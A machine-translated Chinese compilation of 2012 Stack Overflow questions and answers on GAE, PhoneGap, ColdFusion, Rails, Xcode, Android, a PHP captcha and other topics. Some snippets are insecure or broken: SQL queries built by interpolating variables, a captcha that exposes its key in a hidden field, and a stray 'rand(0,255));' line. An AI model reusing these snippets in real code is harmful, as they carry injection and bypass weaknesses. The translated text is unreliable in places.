我正在对部署在我机器上的 Tomcat 上的应用程序进行 API 调用，并期待 XML 响应，但不起作用。有人可以提出解决方案或替代路线吗？

我正在使用 IT 构建笔记本电脑，并怀疑这可能是问题所在，因此我尝试使用不在防火墙后面且不在公司网络上的笔记本电脑，但这也没有帮助。

代码片段：

```
base_url = 'http://localhost:8080/recomendations/'
url = (base_url + 'api/1.0/otherusersalsoviewed?' + urlencode(args))
req = urlfetch.fetch(url, None, urlfetch.GET, {}, False, True, 60, False) 
if req.status_code==200:
   root = ElementTree(fromstring(req.content)).getroot() 
```

知道有什么问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:38:23.707

请注意，您指定的 url 指向 localhost，这意味着“这台计算机”（请参阅[​​ http://en.wikipedia.org/wiki/Localhost](http://en.wikipedia.org/wiki/Localhost)），即当您将应用程序部署到 GAE localhost 时，请参阅 GAE，即无意义的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-21T15:21:01.537

以防万一，我得到：

```
ApplicationError: 2 
```

我修复了删除对[users.create_logout_url()的引用](https://cloud.google.com/appengine/docs/python/users/loginurls)

# javascript - jQuery AJAX 移除 Phonegap 上的 Javascript

> ID：11235743
> 
> 赞同：0
> 
> 时间：2012-06-27T22:35:05.367
> 
> 标签：javascript, jquery, ajax, security, cordova

我正在使用 jQuery 和 Phonegap 编写应用程序

在我的 javascript 代码中，我调用 $.ajax 来向我的 Web 服务器请求应用程序的某些部分。这些部分基本上是我插入到 DOM 中的 html 片段。这些片段包含与该部分本身相关的 javascript 代码（这是动态构建的，这就是为什么我不将它包含在应用程序的主 js 文件中）

我使用以下代码调用这些部分：

```
//...
$.ajax(
            url,
            {
                type: 'GET',
                success: function(data){
                    $('#content').html(data);
                },
                error: function(jqXHR, textStatus, errorThrown) {
                    //...
                }
            });
//... 
```

从 Web 服务器返回的数据类似于：

```
<div>...<div>
<script type="text/javascript">
$(document).ready(function() {
   //some code to be executed when this section loads
   //this is dynamically generated
});
</script> 
```

现在，问题是当这段代码执行时，它没有将 SCRIPT 标记插入 DOM（只有 html 部分）。

这在 Chrome 上运行得很好，但是当我在模拟器上测试它（使用 Ripple）时却没有。

我认为这可能是一项安全检查，但对此不确定。

我的 config.xml 有这个：

```
<?xml version="1.0" encoding="UTF-8"?>
<widget xmlns="http://www.w3.org/ns/widgets" 
        xmlns:gap = "http://phonegap.com/ns/1.0" 
        version="0.1.1"
        versionCode="1"
        id="com.company.prod">  
    <name>...</name>
    <author>...</author>
    <description>...</description>

    <gap:splash src="splash.png" />

    <content src="index.html"/>
    <access uri="*" subdomains="true"/>

    <feature name="http://api.phonegap.com/1.0/battery"/> 
    <feature name="http://api.phonegap.com/1.0/geolocation"/> 
    <feature name="http://api.phonegap.com/1.0/network"/>
    <feature name="http://api.phonegap.com/1.0/notification"/>

</widget> 
```

知道为什么会这样吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:43:20.537

如果我没记错的话，这是因为您不能附加或使用 innerHTML 来插入脚本标签。我建议将此 ajax 调用的位置更改为将进行插入的位置，然后更改行

```
$('#content').html(data); 
```

至

```
document.write(data); 
```

# php - 如何将 get_browser() 从 PHP 移植到 ColdFusion？

> ID：11235747
> 
> 赞同：0
> 
> 时间：2012-06-27T22:35:40.413
> 
> 标签：php, coldfusion, browser-detection

`browscap.ini`[`get_browser()`](http://php.net/manual/en/function.get-browser.php)取决于[http://browsers.garykeith.com/downloads](http://browsers.garykeith.com/downloads) _

有谁知道如何将看似简单的移植[`get_browser()`](http://php.net/manual/en/function.get-browser.php)到 CFML？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T02:02:49.750

**解决了！**

这是基于[http://forums.adobe.com/thread/620512](http://forums.adobe.com/thread/620512)的，并针对性能进行了优化，并提高了正确性。

它仍然很慢（~1s），因为使用 ColdFusion 处理 ini 文件意味着每个`getProfileString()`都是磁盘 I/O！使用 SSD 可能会更快。:)

```
function get_browser(user_agent=CGI.HTTP_USER_AGENT, browscap_ini=expandPath("./browscap.ini"))
{
    var result = {};

    // Read wildcard patterns from the INI file
    var browscap_list = getProfileSections(browscap_ini);

    // Seed some variables
    var browser_champion_pattern = "*";

    // Loop through the patterns to find the best match (relative to length of name pattern)
    for (var browser_name_pattern in browscap_list)
    {
        if (len(browser_name_pattern) >= len(browser_champion_pattern))
        {
            // Massage the wildcard into useable regex
            var browser_name_regex = replaceList(browser_name_pattern, ".,*,?,(,),[,]", "\.,.*,.,\(,\),\[,\]");

            if (left(browser_name_pattern, 1) != "*")
                browser_name_regex = "^" & browser_name_regex;

            if (right(browser_name_pattern, 1) != "*")
                browser_name_regex &= "$";

            // Test the resulting regex against the user agent
            if (reFindNoCase(browser_name_regex, user_agent))
                browser_champion_pattern = browser_name_pattern;
        }
    }

    // Set the winning regex patterns
    var browser_name_pattern = browser_champion_pattern;

    // Fetch the winning info
    var keynames = listToArray(browscap_list[browser_champion_pattern]);
    for (var keyname in keynames)
        result[keyname] = getProfileString(browscap_ini, browser_champion_pattern, keyname);

    // Fetch the rest of the info from parents
    while (structKeyExists(result, "parent"))
    {
        var parent = result.parent;

        structDelete(result, "parent");

        var keynames = listToArray(browscap_list[parent]);
        for (var keyname in keynames)
            if (!structKeyExists(result, keyname))
                result[keyname] = getProfileString(browscap_ini, parent, keyname);
    }

    return result;
} 
```

# windows-8 - 如何从旧程序在 Windows 8 中制作自定义磁贴？

> ID：11235748
> 
> 赞同：5
> 
> 时间：2012-06-27T22:35:42.980
> 
> 标签：windows-8

我有一个旧的 Visual Studio 6 制作的程序，当我在 Windows 8 上安装它时，它有一个默认磁贴。问题是，它是较小的磁贴，程序名称太长而无法舒适地放入，而且图标已调整大小并且看起来很糟糕。

有没有一种方法可以创建具有不同大小和图标的自定义 Windows 8 磁贴，而无需实际创建特定的 Windows 8 程序？如果可能的话，我也希望能够使用批处理文件来做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-24T18:30:08.847

Windows 8 中的 Metro 应用程序具有创建动态磁贴、辅助磁贴、宽磁贴等的完整体验。只有 Metro 应用程序可以自定义它们的磁贴，而不是桌面应用程序。磁贴 API 仅存在于 WinRT for Metro 应用程序中。

对于像您这样的桌面应用程序（不是 Metro 的“旧 Visual Studio 6 制作程序”），您可以试试这个：http: [//msdn.microsoft.com/en-us/library/windows/desktop/cc144119 (v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/cc144119(v=vs.85).aspx)。确保也单击左侧边栏中的其他主题。

编辑：此方法可以更改旧应用程序的图标。由于图标是在开始菜单中使用的，这是一种在新开始菜单中为旧应用程序提供更具吸引力的静态图标的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-29T12:13:49.293

虽然 Windows 8 中的桌面应用程序不支持动态磁贴，但您可以通过确保图标资源具有[48 像素、64 像素、96 像素和 128 像素的大小来改善图标的外观](http://msdn.microsoft.com/en-us/library/windows/desktop/jj673981%28v=vs.85%29.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-07-31T16:59:26.613

要创建磁贴，请右键单击可执行文件（.exe、.com、.bat 等），然后左键单击“Pin to Start”。

要调整图块的大小，请右键单击图块并选择所需的大小。

要移动磁贴，请将其拖放到您想要的位置。

如果要更改名称，请创建一个快捷方式，将快捷方式名称更改为您想要的名称，然后将其固定以启动。

# ruby-on-rails - Ruby 将“Model.all”保存到应用程序范围的变量中

> ID：11235749
> 
> 赞同：0
> 
> 时间：2012-06-27T22:35:49.647
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, variables

我有一个名为 的模型`Business`，我想将其保存`Business.all`到一个可以从 Rails 应用程序的另一部分访问的变量中。做这个的最好方式是什么？我对 Ruby/Ruby on Rails 相当陌生，我知道类和实例变量，但我对此有点模糊。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:48:28.680

如果您希望在整个应用程序中都可以访问它，您可以将它放入`app/controllers/application_controller.rb`.

例子：

```
class ApplicationController < ActionController::Base
  protect_from_forgery
  before_filter :find_all_businesses

  def find_all_businesses
    @businesses = Business.all 
  end
end 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:48:02.887

您可能想查看 Rails 缓存。这里有一个很好的截屏视频：

[http://railscasts.com/episodes/115-caching-in-rails-2-1](http://railscasts.com/episodes/115-caching-in-rails-2-1)

它也适用于 Rails 3。例如，如果添加了业务，这将允许您使缓存过期。

# iphone - xcode 4.3.2核心数据，在哪里设置删除规则

> ID：11235751
> 
> 赞同：3
> 
> 时间：2012-06-27T22:36:24.207
> 
> 标签：iphone, xcode, core-data

我终其一生都找不到在 Xcode 4.3.2 中为 Core Data 设置删除规则的位置，不在文件检查器中，不在 Core Data Model 检查器中，也不在我单击任何东西时，例如实体、关系等。相信我，我点击了我能看到的一切。请帮忙。我在哪里以及如何设置删除规则。我想将其设置为级联...谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:41:11.380

选择您的关系并选择右侧窗格中的“数据模型检查器”选项卡，它应该如下所示：

![数据模型检查器](../Images/529011f6031e6f611b1836ca8c69cad6.png)

删除规则是倒数第二个选项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:42:48.683

您必须在 XCode 中打开 Core Data Model 文件，选择您的关系（显然属性没有删除规则），转到右侧检查器面板中的第三个选项卡并选择您的删除规则：

![在此处输入图像描述](../Images/1bb289d9e96491ae0f40e53940d12e92.png)

# php - 我的 PHP MySQL 语法太长

> ID：11235756
> 
> 赞同：0
> 
> 时间：2012-06-27T22:37:08.010
> 
> 标签：php, mysql

谢谢，非常好的解决方案，这回答了我的问题。如果我的 $sql 如下，我该如何使用您的解决方案：

```
$sql = "SELECT * FROM $tbl_main, $tbl_country, $tbl_members
WHERE ($tbl_main.country_id = $tbl_country.country_id) AND ($tbl_main.member_id = $theselect) ORDER BY $chosenTable.$orderby LIMIT $startpoint, $limit"; 
```

即我如何在代码中间的某个地方使用您的解决方案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T22:38:27.997

您可以有条件地连接额外的条件：

```
$sql = "SELECT * FROM $tbl_main, $tbl_country, $tbl_members
WHERE ($tbl_main.country_id = $tbl_country.country_id)";

if(isset($theselect)) {
    $sql .= " AND ($tbl_main.member_id = $theselect)"; 
}

$sql .= " ORDER BY $chosenTable.$orderby LIMIT $startpoint, $limit"; 
```

# ios - Xcode iOS 基础 SDK 缺失

> ID：11235759
> 
> 赞同：4
> 
> 时间：2012-06-27T22:37:53.220
> 
> 标签：ios, xcode, sdk, target

我有一个我从未分发过的旧 iOS 应用程序，现在我正在尝试再次处理该项目。它适用于早期版本的 Xcode，但当时我还没有准备好部署它。现在我正在使用当前版本的 Xcode，但我有一个错误，即缺少基本 SDK。我已经用该错误消息探索了这里的每个帖子，但它们对我不起作用。

在 Xcode 中进行调查。我可以在“项目”窗格下选择我的应用程序。选择 Info 选项卡后，它在 Deployment Target 下为“Mac OS X Deployment Target”，在下拉列表中为 Default。

这是一个 iOS 应用程序，而不是 Mac OS X 应用程序。我该如何改变？

我已经将基本 SDK 作为最新的 iOS。

建议？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-27T23:34:24.353

尝试这个：

1.  打开 Xcode 并按 cmd + 1

2.  在左侧面板中选择您的项目-> 中心面板中的目标-> 右侧面板中的构建设置

3.  找到“Base SDK”并选择“Latest iOS”。如果您看到 Release 和 Debug 行，则为 Release 和 Debug 选择此行。

4.  重启你的 Xcode

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-27T23:09:44.757

通常当你看到这个时，你有一个旧的 iOS 项目并且你正在使用一个使用更新的基本 iOS 的 Xcode 版本。在这些情况下，您可以单击左侧项目导航器树结构顶部的目标，您将看到项目设置。有一个标有“验证设置”的按钮，将显示在主面板的中下部附近。点击它。

如果不这样做（例如，它来自一个*非常*旧的版本并且 Xcode 无法弄清楚如何修复它），那么重新创建项目可能会更容易。创建一个新的 iOS 项目，然后将您的源代码、它的 NIB 和资源复制到该项目中。也许这比尝试修复您拥有的旧项目更容易。

# .net - Clickonce证书不起作用？

> ID：11235767
> 
> 赞同：0
> 
> 时间：2012-06-27T22:38:52.627
> 
> 标签：.net, deployment, clickonce, code-signing

我们有一个 Outlook 插件 .vsto 的项目，我们正在尝试使用我们生成的证书进行签名。证书是从本地 CA 生成的。当我将它添加到“签名”选项卡中的项目时，所有信息都显示出来并且看起来不错。我发布并尝试运行它，我收到提示，指出它无法验证发布者。我尝试使用 mage 将其辞职，甚至将 -usemanifestfortrust 设置为 true 并设置发布者名称。结果相同。我试过辞去 .vsto 和清单。我还删除了所有内容的 .deploy 扩展名，并通过 mage 完成了更新，所有结果都相同。我们很难过。

有没有人有什么建议？我已经阅读了大约 50 篇关于它的文章（这是我获得这些故障排除想法的地方），但没有运气。TIA

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T04:01:43.373

事实证明，这与证书模板未导出密钥有关。我们注意到 CA 上的证书生成器（允许导出密钥）中的复选框是灰色的，并且没有任何方法可以启用它。我让我们的管理员进行了调查，他告诉我必须创建一个自定义模板，该模板启用复选框并重新生成它。从那里，我所做的就是用证书签署项目，一切都很好。当您运行安装程序时，它现在会提示您提供信息和绿色复选标记图标。当然，如果您将证书添加到受信任的商店，您甚至不会收到提示。该应用程序供公司使用，因此不需要威瑞信。

# android - 一段时间后关闭进度条？

> ID：11235771
> 
> 赞同：2
> 
> 时间：2012-06-27T22:39:06.203
> 
> 标签：android, progress-bar

有没有办法为进度条设置计时器？例如等待 10 秒然后关闭进度条？如果有人能给我一个简单的代码，我将不胜感激。

提前谢谢了 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:58:35.420

您可以在 UI-Thread 中创建一个[处理](http://developer.android.com/reference/android/os/Handler.html)程序，然后通过[sendMessageDelayed](http://developer.android.com/reference/android/os/Handler.html#sendMessageDelayed%28android.os.Message,%20long%29)调用它。

```
...
final Handler h = new Handler() {
  @Override
  public void handleMessage(Message message) {
    mProgressBar.dismiss();
  }     
};
h.sendMessageDelayed(new Message(), 10000);
... 
```

此代码不是 testet。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:54:23.143

使用[处理程序](http://developer.android.com/reference/android/os/Handler.html)类。

```
import android.os.Handler;
import android.os.Message;

public class someClass implements Handler.Callback {
    public static final int MSG_HIDE_PBAR = 0;
    static final long PBAR_DELAY = 10 * 1000; //Delay is is milliseconds

    //Probably should initialize this in your creation code (onCreate if activity)
    //and likewise set it to null when destroyed (onDestroy if activity)
    private Handler mHandler = new Handler(this); 

    public void showPbar(){
        //Show your progress bar here
        mHandler.sendEmptyMessageDelayed(MSG_HIDE_PBAR, PBAR_DELAY);
    }

    public boolean handleMessage(Message msg){
        switch (msg.what){
            case MSG_HIDE_PBAR:
                //hide your progress bar here, call postInvalidate instead of
                //invalidate because we are in a different thread
                break;
        }
        return true;
    }
} 
```

快速：是，脏：是，完成工作：是

您可以使用带有睡眠调用或循环检查时钟的[AsyncTask来完成相同的操作。](http://developer.android.com/reference/android/os/AsyncTask.html)`Handler`对我来说似乎更干净。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:57:21.697

是的，您可以在 10 秒后使用`Thread`和[runOnUiThread](http://developer.android.com/reference/android/app/Activity.html)解除：

```
public void myThread() {
    Thread th = new Thread() {
        @Override
        public void run() {
            try {
                while (mRunning) {
                    Thread.sleep(10L);//10s wait
                    YourCurrentActivity.this.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            // TODO Auto-generated method stub
                            //DISMISS PROGRESS BAR HERE
                            mRunning = false;
                        }
                    });
                }
            } catch (InterruptedException e) {
                // TODO: handle exception
            }
        }
    };
    th.start();
} 
```

# iphone - UITextField 在句点“，”之后限制位数

> ID：11235780
> 
> 赞同：0
> 
> 时间：2012-06-27T22:40:25.110
> 
> 标签：iphone, xcode, uitextfield

我有一个 UITextField ，您只能在其中输入数字和句点“，”这是它的制作方式：

```
#define NUMBERS @"0123456789"
#define NUMBERSPERIOD   @"0123456789,"

- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string {

NSCharacterSet *cs;
NSString *filtered;

// Check for period
if ([textFieled.text rangeOfString:@","].location == NSNotFound) {

    cs = [[NSCharacterSet characterSetWithCharactersInString:NUMBERSPERIOD] invertedSet];
    filtered = [[string componentsSeparatedByCharactersInSet:cs] componentsJoinedByString:@""];
    return [string isEqualToString:filtered];
}

// Period is in use
cs = [[NSCharacterSet characterSetWithCharactersInString:NUMBERS] invertedSet];
filtered = [[string componentsSeparatedByCharactersInSet:cs] componentsJoinedByString:@""];

return [string isEqualToString:filtered];

} 
```

现在我想将“，”之后输入的数字限制为 2。我不知道该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T13:42:54.887

```
int positionOfPeriod = [filtered rangeOfString:@","].location;
filtered = [filtered substringToIndex: MIN(positionOfPeriod+3, [filtered length])]; 
```

# php - 如何从网站上的元素中获取信息？

> ID：11235783
> 
> 赞同：0
> 
> 时间：2012-06-27T22:40:43.253
> 
> 标签：php, javascript, html

这是问题所在：

```
<h2><b>Progress: </b> <font color="87edff">3 / 5</font> <b>Clicks</b></h2> 
```

我想用 PHP 或 Javascript 编写一个脚本来检查第一个数字（在这种情况下为 3），如果它大于某个数字（例如 5），则执行诸如显示隐藏文本、打开链接等操作。

有谁知道如何（或如果不能）做到这一点？我想过使用 POST + GET 变量，但没有成功。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:43:25.573

使用正则表达式获取 3/5，然后在`/` 之后拆分，只需从数组中比较它。

您也可以作为另一条路线，命名包含 3/5 的元素并使用 jquery 获取该值。然后你会做同样的事情，拆分字符串`/`并比较它。

POST/GET 仅在提交表单或将数据发送到服务器上的脚本时可用。这些主要用于`textarea`和输入

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T23:20:17.063

如果您已经在使用 jquery，一些花哨的 jquery 选择器会这样做：

[http://jsfiddle.net/qPPsH/1/](http://jsfiddle.net/qPPsH/1/)

```
findThings = function(){
    // select the first <b> elements that contain "Clicks", AND
    // has a sibling before it that is a <font>, AND
    // has a sibling THAT has both an <h2> as a parent, and contains the text "Progress".

    var firstnumber = -1;  // some number that doesn't make sense
    var secondnumber = -1;

    $('h2 > b:contains("Progress:") + font + b:contains("Clicks"):first').each(
        function(){
            //alert("Element is:",this);
            //alert("Element contains:" + $(this).text());

            // "this" is the <b> that contains "Clicks". Find the first sibling that is a <font> and grab the text from it.
            text = $(this).siblings("font:first").text();
            //alert(text);

            numbers = text.split("/"); //split the text by "/" character.

            if (numbers.length == 2){ // make sure there are two numbers!
              firstnumber = numbers[0];
              secondnumber = numbers[1];
            }
        }
    );

    alert("First number:" + firstnumber);
    alert("Second number:" + secondnumber);

    var whatever = 5;
    if(firstnumber >= whatever){
        alert("YOU WIN!");
    }else{
        alert("You Lose!");
    }
} 
```

但这仅适用于将代码放置在同一站点上的情况。如果它在同一个站点上，那么无论如何这都是一个*可怕的想法*，因为您可以在元素上粘贴一个 id 并通过 id 访问该值。尽管如此，还是展示了选择器的酷炫程度。

# azure - Windows Azure 上长时间运行（或永久）的任务

> ID：11235787
> 
> 赞同：5
> 
> 时间：2012-06-27T22:41:09.530
> 
> 标签：azure, amazon-web-services, cloud, background-process, long-running-processes

我需要每 50 秒左右将一些数据写入数据库。它类似于在后台运行并静默执行其工作的 Windows 服务。在我的情况下，启动和停止不是一个选项，因为我需要将少量先前插入的数据存储在内存中。使用 Windows Azure 或 AWS 时，最好的解决方案是什么？

谢谢你。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-28T01:20:24.170

使用 Windows Azure，您可以选择 Web 或 Worker 角色（基本上都是 Windows 2008 Server R2 或 SP2）并拥有某种类型的定时事件，正如 @Lucifure 建议的那样。您还可以运行调度程序，如 Quartz.net，或利用 Windows Azure 队列或服务总线队列在特定时间显示消息。但是：您不能在给定的角色实例中拥有“永久”任务，因为您的 VM 实例将定期重启（例如，每月进行主机操作系统维护）。使用角色关闭，您会收到通知，您可以在`Stopping()`或中处理这些关闭通知`OnStop()`。如果您有多个实例，您可以使用调度程序或队列来确保您的事件仍然每 50 秒左右触发一次，并跨多个实例进行处理（但在任何给定时间仅由一个实例处理）。

为了保存您的内存信息，一个想法是将该信息存储在缓存中。您有 2 个选择：

*   分布式（共享）缓存服务，已经存在了一段时间。它独立于您的角色实例运行。
*   内存缓存，2012 年 6 月刚刚推出。假设您有多个实例，缓存分布在这些实例中。您甚至可以在现有角色的内存中运行缓存。

更多关于缓存的信息在[这里](http://msdn.microsoft.com/en-us/library/windowsazure/gg278356.aspx)。

有一些关于 Quartz.net 和 Windows Azure 的 StackOverflow 答案，例如[这个](https://stackoverflow.com/questions/6249071/quartz-net-jobs-in-azure-webrole)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T22:50:32.653

在 Windows Azure 上，您可以使用 Worker Role，它可以做到这一点。它可以像一个while循环一样简单。

试试这篇文章的介绍。 [http://www.c-sharpcorner.com/uploadfile/40e97e/windows-azu-creating-and-deploying-worker-role/](http://www.c-sharpcorner.com/uploadfile/40e97e/windows-azu-creating-and-deploying-worker-role/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T00:04:40.250

您可以将 System.Threading.Timer 设置为每 50 秒左右触发一次，并在事件发生时执行您的工作。

# content-management-system - TYPO3 域和子域一次安装

> ID：11235796
> 
> 赞同：2
> 
> 时间：2012-06-27T22:41:54.687
> 
> 标签：content-management-system, typo3

有以下问题。

我使用 TYPO3 版本 4.7.1，并且为这两个站点配置了域记录。

*   Internet站点`www.domain.com`→→根ID =`77`
*   外网站点 → `service.domain.com`→ 根 id =`104`

但是，这两个站点都将被重定向到 Internet 站点。

我该如何设置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T02:21:47.930

您是否为每个域创建了模板？您是否将这些模板设置为根？

有关详细信息，请参阅[http://wiki.typo3.org/Multidomain 。](http://wiki.typo3.org/Multidomain)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T20:17:57.837

还转到页面属性/编辑 -> 行为 -> 杂项 -> 以 root 身份使用：选中复选框。

清除缓存。

如果可能，请设置以下内容：

```
[globalString = ENV:HTTP_HOST=domain.local]
config.baseURL = http://domain.local
[globalString = ENV:HTTP_HOST=www.domain1.tld]
config.baseURL = http://www.domain1.tld
[globalString = ENV:HTTP_HOST=www.domain2.tld]
config.baseURL = http://www.domain2.tld
[global] 
```

# asp.net - 在开发时将数据库托管在远程服务器上

> ID：11235801
> 
> 赞同：0
> 
> 时间：2012-06-27T22:42:15.687
> 
> 标签：asp.net

我想知道是否可以将我的数据库托管在远程服务器上，并且在我开发它时仍然在我的本地计算机上运行该应用程序。

我正在使用 asp.net。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:47:30.663

是的，而不是使用`.`或您的机器名称作为服务器，只需输入 IP 地址即可。

因此，如果您只是使用连接字符串

```
Data Source=yourRemoteServer;Initial Catalog=myDataBase;User Id=myUsername;Password=myPassword; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:47:57.320

太糟糕了，帖子中提到“所以不是你的私人研究助理走了”哈哈。它非常参与！您首先必须决定在哪里托管数据库，然后向他们注册一个新帐户，创建数据库，设置您的架构或设法使用他们的 janky 导入功能，从他们的服务中收集连接字符串，访问您的网站.config 文件并更新您的连接字符串以反映他们的连接字符串和 vuala。

# javascript - Asp.Net 中的动态菜单网格

> ID：11235804
> 
> 赞同：0
> 
> 时间：2012-06-27T22:42:46.417
> 
> 标签：javascript, jquery, asp.net, html, css

我想构建一个包含动态菜单的网页（在 Asp.Net 中），用户可以在其中移动图标或菜单内容，例如 android 中的网格菜单......我应该使用什么？CSS、Javascript、HTML5 或 JQuery，任何东西都可以开始。我想要的只是一个可以动态移动图标的大图标菜单......

谢谢大家...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:58:30.850

相当广泛的问题，但你肯定需要 Javascript/jQuery 来完成这项工作。我会查看 jQuery UI 库，尤其是[http://jqueryui.com/demos/draggable/](http://jqueryui.com/demos/draggable/)中的可拖动元素。

由于您的目标是创建一个带有动态内容的 Asp.Net 站点，因此我假设它可以提供菜单；我将首先使用 Html、CSS 和 jQuery 构建您想要的那种菜单的静态版本。一旦你让那部分工作正常，你可以考虑构建一个 Asp.NET 用户控件或一个可配置的自定义控件，它将基于动态内容呈现整个 html/JS/css 标记。

# php - 在 https://

> ID：11235807
> 
> 赞同：0
> 
> 时间：2012-06-27T22:43:13.533
> 
> 标签：php, https

我在 php 中编写了以下代码来生成验证码。该代码在 https:// 下运行，在 IE9、Mozilla、Chrome 和 Safari 中运行良好。但是，在 IE8 中，有时它可以工作，有时它不能（显示损坏的图像）。有谁知道发生了什么？任何人都可以看到下面的代码有什么问题会导致 IE8 出现问题：

```
 class Captcha_generator{

        function __construct()
        {

        }

        public function get_image($callType)
        {
            $font = './image/MONOFONT.TTF';
            $width='140';
            $height='40';
            $font_size = $height * 0.75;
            $angle = 3; 

            //Now lets use md5 to generate a totally random string 
            $md5 = md5(microtime() * mktime()); 

            /* 
            We dont need a 32 character long string so we trim it down to 5 
            */ 
            $string = substr($md5,0,5);
            /* 
            Now for the GD stuff, for ease of use lets create 
            the image from a background image. 
            */ 

            $captcha = imagecreate($width, $height);
rand(0,255));

            /* 
            Lets set the colours, the colour $line is used to generate lines. 
            Using a blue misty colours. The colour codes are in RGB 
            */ 

            $background_color = imagecolorallocate($captcha, 255, 255, 255);
            $text_color = imagecolorallocate($captcha, 20, 40, 100);
            $noise_color = imagecolorallocate($captcha, 100, 120, 180);

            /* generate random dots in background */
            for( $i=0; $i<($width*$height)/3; $i++ ) {
             imagefilledellipse($captcha, mt_rand(0,$width), mt_rand(0,$height), 1, 1, $noise_color);
            }
            /* generate random lines in background */
            for( $i=0; $i<($width*$height)/150; $i++ ) {
             imageline($captcha, mt_rand(0,$width), mt_rand(0,$height), mt_rand(0,$width), mt_rand(0,$height), $noise_color);
            }

            /* 
            Encrypt and store the key inside of a session 
            */ 

            $_SESSION['captcha_key'] = md5("SDFSDTRSDERGTGGT".$string."AAAAA"); 

            /* 
            Output the image 
            */ 

            imagettftext($captcha, $font_size, $angle, 30, 30, $text_color, $font , $string);
            imagepng($captcha, './image/captcha.png');

            if($callType == "internal")
            {
                return "<img style='z-index:90' width='130' height='35' src='image/captcha.png?".time()."' />; 
                        <input type='hidden' name='powerCode' value='".$_SESSION['captcha_key']."'/>";
            }
            else 
            {
                echo "<img style='z-index:90' width='130' height='35' src='image/captcha.png?".time()."' />";
                echo "<input type='hidden' name='powerCode' value='".$_SESSION['captcha_key']."'/>";
            }
        }

     } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T23:33:21.003

这更像是一个评论而不是一个答案，并且只展示了如何将验证码 PNG 图像转换为 data-uri：

```
 /* 
        Output the image 
        */ 

        imagettftext($captcha, $font_size, $angle, 30, 30, $text_color, $font , $string);
        ob_start();
        imagepng($captcha);
        $captchaURI= 'data:image/png;base64,'.base64_encode(ob_get_clean()); 
```

请注意此处输出控制功能的使用。它们通常非常有用，例如让你的函数回显或返回字符串而不复制代码：

```
 ob_start();
        echo "<img style='z-index:90' width='130' height='35' src='", $captchaURI, "' />";
        echo "<input type='hidden' name='powerCode' value='", $_SESSION['captcha_key'], "'/>";
        if ($callType == "internal")
        {
             return ob_get_clean();
        }
        ob_end_flush(); 
```

# javascript - 如何从 iframe 的 $(document).ready 中检查父框架中的复选框？

> ID：11235809
> 
> 赞同：0
> 
> 时间：2012-06-27T22:43:23.873
> 
> 标签：javascript, jquery, iframe

我试过了：

```
$(document).ready(function(){
    $(parent.top).find('.IAgreeCheckBox:first').prop("checked", true);  
}); 
```

无济于事。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-27T22:48:29.463

```
$('.IAgreeCheckBox:first', window.parent.document).prop('checked', true); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-27T22:45:38.607

你会想要`document`对象，而不是`window`：

```
$(parent**.document**).find('.IAgreeCheckBox:first')
```

[这是一个演示。](http://jsfiddle.net/minitech/dR2e8/show/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T23:11:49.020

如果上下文方法不起作用，请尝试以下操作：

```
parent.$("#wOnlineApplication_cbxIAgree").prop("checked", true); 
```

这就是我在 iframe 页面中引用父元素的方式。

# windows-8 - 如何在 WinRT 中平铺背景图像？

> ID：11235813
> 
> 赞同：13
> 
> 时间：2012-06-27T22:43:42.097
> 
> 标签：windows-8, winrt-xaml

由于 WinRT 中没有 VisualBrush，我不确定该方法。任何人？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-28T20:52:25.257

目前我不相信有办法，虽然 ImageBrush 从 TileBrush 继承，但它缺少重要的属性 TileMode。目前尚不清楚这是否会包含在以后的版本中。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-29T20:39:09.990

实际上，除了更改深色和浅色主题之外，没有太多关于 XAML 样式 WinRT 的信息......

所以我想我们必须摆弄和实验......

在网上进行一些谷歌搜索时，我附带了以下链接......不妨试一试......

在 Metro 风格 XAML 应用程序中创建平铺背景

